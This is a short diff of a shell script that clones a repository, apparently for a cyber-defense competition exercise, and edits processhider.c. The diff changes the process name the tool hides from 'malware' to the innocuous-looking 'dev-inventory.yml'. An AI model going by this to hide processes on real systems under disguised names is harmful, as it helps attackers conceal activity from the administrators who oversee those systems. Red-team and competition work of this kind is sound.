@@ -18,7 +18,7 @@ fi
 REPO_URL="https://github.com/AYanofsky/ccdc-invisible-saturation/"
 TARGET_FILE="processhider.c"
 SEARCH_STRING="static const char* process_to_filter = "evil_script.py";"
-REPLACE_STRING="static const char* process_to_filter = "malware";"
+REPLACE_STRING="static const char* process_to_filter = "dev-inventory.yml";"
 
 # Clone the repository
 echo "Cloning repository..."
